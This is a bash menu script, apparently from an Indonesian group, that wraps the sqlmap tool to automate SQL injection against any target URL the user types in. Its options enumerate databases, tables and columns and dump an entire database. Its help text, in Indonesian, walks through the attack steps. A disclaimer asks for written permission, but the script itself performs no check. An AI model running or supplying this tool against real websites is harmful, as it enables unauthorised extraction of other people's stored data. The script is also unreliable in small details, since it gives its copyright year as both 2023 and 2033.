black='\e[0;30m'
blue='\e[0;34m'
green='\e[0;32m'
cyan='\e[0;36m'
red='\e[0;31m'
purple='\e[0;35m'
brown='\e[0;33m'
lightgray='\e[0;37m'
darkgray='\e[1;30m'
lightblue='\e[1;34m'
ijo='\e[1;32m'
an='\e[1;36m'
ed='\e[1;31m'
lightpurple='\e[1;35m'
yellow='\e[1;33m'
white='\e[1;37m'
nc='\e[0m'


echo -e
figlet "Z AUTO SQL" | lolcat
echo -e -e "${ed}"
echo -e "${an}[${white}•${an}] ${white}www.zeroforce.org ${an}[${white}•${an}]"
echo -e "${an}"
echo -e "=========================="
echo -e "# ${white}automatic sqlmap tools ${an}#"
echo -e "# ${white}./cyfin77 X ./xyra77 ${an}  #"
echo -e "# ${white}Tools version: 1.0 ${an}    #"
echo -e "=========================="
echo -e
echo -e "${yellow}"
read -p "[?] Target => " t
echo -e
echo -e "${white}[${ijo}1${white}] views database "
echo -e "${white}[${ijo}2${white}] views tables"
echo -e "${white}[${ijo}3${white}] views data on table"
echo -e "${white}[${ijo}4${white}] dump database"
echo -e "${white}[${yellow}5${white}] Help"
echo -e "${white}[${ed}6${white}]${ed} DISCLAIMER"
echo -e "${an}[${white}•${an}]${white}======================${an}[${white}•${an}]"
echo -e
read -p "[?] input select -> " select

if [[ $select == "1" ]];
then
echo -e "${white}[${an}•${white}] viewed database on ${green}$t ${white}[${an}•${white}]"
sqlmap -u $t --dbs
echo -e "${white}[${an}•${white}] SUCCES ${white}[${an}•${white}]"
bash z-sql.sh
elif [[ $select == "2" ]];
then
read -p "[?] database name: " db_name1
echo -e "${white}[${an}•${white}] viewed tables name on ${green}$t ${white}in database ${green}$db_name1 ${white}[${an}•${white}]"
sqlmap -u $t -D $db_name1 --tables
echo -e "${white}[${an}•${white}] SUCCES ${white}[${an}•${white}]"
bash z-sql.sh
elif [[ $select == "3" ]];
then
read -p "[?] database name: " db_name2
read -p "[?] table name: " tb_name1
echo -e "${white}[${an}•${white}] viewed data on ${green}$t ${white}in database ${green}$db_name2 ${white}table ${green}$tb_name1 ${white}[${an}•${white}]"
sqlmap -u $t -D $db_name2 -T $tb_name1 --columns
echo -e "${white}[${an}•${white}] SUCCES ${white}[${an}•${white}]"
bash z-sql.sh
elif [[ $select == "4" ]];
then
read -p "[?] database name: " db_name3
echo -e "${white}[${an}•${white}] dump database ${green}$t ${white}[${an}•${white}]"
sqlmap -u $t -D $db_name3 --dump
echo -e "${white}[${an}•${white}] SUCCES ${white}[${an}•${white}]"
bash z-sql.sh
elif [[ $select == "5" ]];
then
echo -e "${yellow}[?] ${white}QUESTION ${yellow}[?]"
echo 
echo 
echo -e "${an}[ ${white}what is ${an}z  automatic sqlmap tools ${white}? ${an}]"
echo
echo -e "${an}z automatic sqlmap tools ${white}adalah tools yang dikembangkan oleh zero force team untuk memperudah pengguna melakukan uji penetrasi terhadap celah sql dengan menggunakan tools sqlmap sebagai alat utama, dan menggabungkan beberapa command dasar sqlmap untuk teknik pengujian"
echo
echo -e "${ed}[${white} Menu1 (views database) ${ed}]"
echo -e "${white}"
echo -e "Masukkan url target untuk mencari/menemukan database (ex: https://www.site.com/page.php?id=1)"
echo
echo -e "${ed}[ ${white} Menu2 (views tables) ${ed}]"
echo -e "${white}"
echo -e "Setelah Menemukan Database target, kita akan menemukan basis data pada database tersebut, ( setiap isi berbeda tergantung database ) "
echo
echo -e "${yellow}Tutorial:"
echo -e "${white} temukan nama database pada target, dan input nama database tersebut untuk kita explorasi (Menu1)"
echo
echo -e "${ed}[ ${white}Menu3 (views data on table) ${ed}]"
echo -e "$white"
echo -e "Setelah Menemukan Nama database dan tabel, lihat dan explorasi isi data dari tabel tersebut"
echo
echo -e "${yellow}Tutorial:"
echo -e "${white}"
echo -e "Temukan nama database target dan nama tabel basis data pada database tersebut untuk kita explorasi (Menu2)"
echo
echo -e "${ed}[ ${white} Menu4 (dump database) ${ed}]"
echo -e "${white}"
echo -e "jika anda ingin langsung menginstall/dump database tatget tanpa mengeksplorasi nya, maka anda cukup menemukan nama database pada target (Menu1)"
echo 
echo -e "Sabtu, 15 juli 01.02  ${ed}© 2023 ${white} ./cyfin77 ${an}zero force team  "
echo
read -p "[•] Enter To Next [•]"
bash z-sql.sh
elif [[ $select == "6" ]];
then
echo
echo -e "${ed}[!] DISCLAIMER [!]"
echo
echo -e "${white}Tools ini dibuat dengan niat untuk membantu pengguna dalam melakukan uji penetrasi yang sah dan bertanggung jawab. Pengguna bertanggung jawab sepenuhnya atas penggunaan tools ini dan harus mematuhi hukum dan peraturan yang berlaku. Penulis alat tidak bertanggung jawab atas penggunaan yang salah, ilegal, atau merugikan pihak lain. Pastikan untuk mendapatkan izin tertulis sebelum melakukan uji penetrasi terhadap sistem yang akan anda uji. Pengguna bertanggung jawab penuh atas konsekuensi hukum atau etika yang mungkin timbul dari penggunaan tools ini"
echo
echo "Pastikan Anda mengikuti etika dan perundang-undangan siber yang berlaku"
echo
echo -e "Sabtu 15 juli ${ed}© 2033 ${white}./cyfin77 ${ed}zero force team"
echo -e "${yellow}"
read -p "[•] Please Enter To Next [•]"
bash z-sql.sh
else
echo -e "${ed}"
read -p "[!] wrong input! please enter to retry [!]"
bash z-sql.sh
fi








